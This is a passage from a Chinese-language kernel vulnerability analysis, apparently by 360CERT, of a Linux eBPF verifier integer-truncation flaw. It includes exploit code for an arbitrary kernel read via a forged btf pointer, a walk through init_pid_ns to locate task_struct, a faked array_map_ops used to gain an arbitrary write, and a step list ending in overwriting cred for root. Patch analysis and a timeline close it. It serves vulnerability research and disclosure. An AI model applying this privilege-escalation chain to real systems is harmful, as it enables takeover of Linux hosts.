            if (err)
                return err;
        }
        if (copy_to_user(uinfo, &info, info_len) || // 传到用户态的info中，泄露信息
            put_user(info_len, &uattr->info.info_len))
            return -EFAULT;
        return 0;
    }
    u32 btf_id(const struct btf *btf)
    {
        return btf->id;
    }
    (gdb) p/x &(*(struct btf*)0)->id  #获取id在btf结构中的偏移
    $56 = 0x58
    (gdb) p/x &(*(struct bpf_map_info*)0)->btf_id #获取btf_id在bpf_map_info中偏移
    $57 = 0x40
所以只需要修改map->btf 为 target_addr-0x58，就可以泄露到用户态info中，泄漏的信息在struct bpf_map_info
结构偏移0x40处，由于是u32类型，所以只能泄露4个字节。
利用代码如下：
    static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) 
    {
        union bpf_attr attr = {
            .map_fd = mapfd,
            .key = (__u64)&key,
            .value = (__u64)value,
                .info.bpf_fd = mapfd,
                .info.info_len = 0x100,
                .info.info = (__u64)info,
        };
        syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
        return *(uint32_t *)((char *)info+0x40);
    }
### 6.2 查找task_struct
    ksymtab 保存init_pid_ns结构的偏移，init_pid_ns字符串的偏移
    kstrtab 保存init_pid_ns的字符串
    (gdb) p &__ksymtab_init_pid_ns
    $4 = ( *) 0xffffffff82322eb4
    (gdb) x/2wx 0xffffffff82322eb4
    0xffffffff82322eb4:    0x001264cc    0x0000a28f
    (gdb) x/2s 0xffffffff82322eb8+0x0000a28f
    0xffffffff8232d147:    "init_pid_ns"
    0xffffffff8232d153:    "put_pid"
    (gdb) x/4gx 0xffffffff82322eb4+0x001264cc
    0xffffffff82449380 :    0x0000000000000002    0x0080000400000000
    0xffffffff82449390 :    0x0000000000000000    0x0000000000000000    
所以我们通过搜索”init_pid_ns” 字符串可以得到`__kstrtab_init_pid_ns`的地址，之后再通过搜索匹配
地址+该地址上四个字节（表示偏移）是否等于`__kstrtab_init_pid_ns`的地址
来判断是否为`__ksymtab_init_pid_ns`，此时找到的地址为`__ksymtab_init_pid_ns+4`，
减去4就是`__ksymtab_init_pid_ns`，上面有`init_pid_ns`结构的偏移，与`__ksymtab_init_pid_ns`地址相加就可以得到`init_pid_ns`结构的地址。
之后通过pid 和
init_pid_ns查找对应pid的task_struct，这里其实就是要理清内核的查找过程，在写利用的时候模拟走一遍。最后找到task_struct中cred位置。
内核是通过find_task_by_pid_ns函数实现查找过程的：
    struct task_struct *find_task_by_pid_ns(pid_t nr, struct pid_namespace *ns)
    {
        RCU_LOCKDEP_WARN(!rcu_read_lock_held(),
                 "find_task_by_pid_ns() needs rcu_read_lock() protection");
        return pid_task(find_pid_ns(nr, ns), PIDTYPE_PID);
    }
nr 为当前进程的pid，ns 为init_pid_ns结构地址，我们需要的是idr字段的内容
    struct pid *find_pid_ns(int nr, struct pid_namespace *ns)
    {
        return idr_find(&ns->idr, nr);
    }
    lib/idr.c：
    void *idr_find(const struct idr *idr, unsigned long id)
    {
        return radix_tree_lookup(&idr->idr_rt, id - idr->idr_base);
    }
需要获取&idr->idr_rt 和 idr->idr_base
    lib/radix-tree.c：
    void *radix_tree_lookup(const struct radix_tree_root *root, unsigned long index)
    {
        return __radix_tree_lookup(root, index, NULL, NULL);
    }
    void *__radix_tree_lookup(const struct radix_tree_root *root,
                  unsigned long index, struct radix_tree_node **nodep,
                  void __rcu ***slotp)
    {
        struct radix_tree_node *node, *parent;
        unsigned long maxindex;
        void __rcu **slot;
     restart:
        parent = NULL;
        slot = (void __rcu **)&root->xa_head;
        radix_tree_load_root(root, &node, &maxindex); //将root->xa_head的值赋给node
        if (index > maxindex)
            return NULL;
        while (radix_tree_is_internal_node(node)) {
            unsigned offset;
            parent = entry_to_node(node); // parent = node & 0xffff ffff ffff fffd
            offset = radix_tree_descend(parent, &node, index); //循环查找当前进程的node
            slot = parent->slots + offset; //
            if (node == RADIX_TREE_RETRY)
                goto restart;
            if (parent->shift == 0) // 当shift为0时，退出，说明找到当前进程的node
                break;
        }
        if (nodep)
            *nodep = parent; 
        if (slotp)
            *slotp = slot; 
        return node; 
    }
重点看radix_tree_descend函数实现：
    RADIX_TREE_MAP_MASK : 0x3f
    static unsigned int radix_tree_descend(const struct radix_tree_node *parent, 
                struct radix_tree_node **nodep, unsigned long index)
    {
        unsigned int offset = (index >> parent->shift) & RADIX_TREE_MAP_MASK;  // 要读取parent->shift的值，并与0x3f 与计算
        void __rcu **entry = rcu_dereference_raw(parent->slots[offset]);  // 获取parent->slots[offset] 作为下一个node
        *nodep = (void *)entry; //
        return offset; //
    }
radix_tree_node的结构如下：
    #define radix_tree_node xa_node
    struct xa_node {
        unsigned char    shift;        /* Bits remaining in each slot */
        unsigned char    offset;        /* Slot offset in parent */
        unsigned char    count;        /* Total entry count */
        unsigned char    nr_values;    /* Value entry count */
        struct xa_node __rcu *parent;    /* NULL at top of tree */
        struct xarray    *array;        /* The array we belong to */
        union {
            struct list_head private_list;    /* For tree user */
            struct rcu_head    rcu_head;    /* Used when freeing node */
        };
        void __rcu    *slots[XA_CHUNK_SIZE];
        union {
            unsigned long    tags[XA_MAX_MARKS][XA_MARK_LONGS];
            unsigned long    marks[XA_MAX_MARKS][XA_MARK_LONGS];
        };
    };
获得当前进程的node后就可以通过pid_task获取相应的task_struct：
    enum pid_type
    {
        PIDTYPE_PID,
        PIDTYPE_TGID,
        PIDTYPE_PGID,
        PIDTYPE_SID,
        PIDTYPE_MAX,
    };
    type 为PIDTYPE_PID， 值为0
    #define hlist_entry(ptr, type, member) container_of(ptr,type,member)
    struct task_struct *pid_task(struct pid *pid, enum pid_type type)
    {
        struct task_struct *result = NULL;
        if (pid) {
            struct hlist_node *first;
            first = rcu_dereference_check(hlist_first_rcu(&pid->tasks[type]), //获取&pid->tasks[0] 的内容
                              lockdep_tasklist_lock_is_held());
            if (first)
                result = hlist_entry(first, struct task_struct, pid_links[(type)]);// first为pid_links[0]的地址，由此获得task_struct的起始地址
        }
        return result;
    }
### 6.3 构造任意写
在exp_elem上填充伪造的array_map_ops，伪造的array_map_ops中将map_push_elem
填充为map_get_next_key ，这样调用map_push_elem时就会调用map_get_next_key
，并将&exp_elem[0]的地址覆盖到exp_map[0]，同时要修改 map 的一些字段绕过一些检查
    spin_lock_off = 0
    max_entries = 0xffff ffff 
    //写入的index要满足(index >= array->map.max_entries), 将map_entries改成0xffff ffff
    map_type = BPF_MAP_TYPE_STACK
    //map 的类型是BPF_MAP_TYPE_QUEUE或者BPF_MAP_TYPE_STACK时，map_update_elem 会调用map_push_elem 
最后调用bpf_update_elem任意写内存
     bpf_update_elem->map_update_elem(mapfd, &key, &value, flags) -> map_push_elem(被填充成 map_get_next_key )
     ->array_map_get_next_key 
    static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)   
    {                                                                                   
        struct bpf_array *array = container_of(map, struct bpf_array, map);             
        u32 index = key ? *(u32 *)key : U32_MAX;                                        
        u32 *next = (u32 *)next_key;                                                    
        if (index >= array->map.max_entries) {    //index                                      
            *next = 0;                                                                  
            return 0;                                                                   
        }                                                                               
        if (index == array->map.max_entries - 1)                                        
            return -ENOENT;                                                             
        *next = index + 1;                                                              
        return 0;                                                                       
    }
map_push_elem 的参数是value 和 uattr 的 flags, 分别对应array_map_get_next_key 的 key 和
next_key 参数，之后有index = value[0]，next = flags ， 最终效果是 *flags =
value[0]+1，这里index 和 next 都是 u32 类型， 所以可以任意地址写 4个byte。
所以利用的整体思路是：
  1. 通过漏洞，使得传进来的值为2，而验证模块认为是1，进而通过右移和乘法操作构造任意数，对map指针进行加减造成越界读写。
  2. 通过&exp_elem[0]-0x110，获得exp_map的地址，exp_map[0] 保存着array_map_ops的地址，可以用于泄露内核地址
  3. &exp_elem[0]-0x110+0xc0（wait_list）处保存着指向自身的地址，用于泄露exp_elem的地址
  4. 利用任意读查找init_pid_ns结构地址
  5. 利用进程pid和init_pid_ns结构地址获取当前进程的task_struct
  6. 在exp_elem上填充伪造的array_map_ops
  7. 修改 map 的一些字段绕过一些检查
  8. 调用 bpf_update_elem任意写内存
  9. 修改进程task_struct 的cred进行提权。
提权效果图：
## 0x07 补丁分析
按正常处理思路，寄存器32位的范围和64位的范围应该分开处理，漏洞的成因正是由于直接将64位值赋值给32位的变量，导致截断，因此补丁就是将32位和64位的情况分开，修正赋值的内容，阻止了整数截断的情况。
## 0x08 时间线
**2020-11-01** 作者公开漏洞信息
**2020-11-02** 360CERT完成漏洞利用
**2020-11-03** 360CERT发布漏洞分析与利用报告
## 0x09 参考链接
  1. 
  2. 
  3. 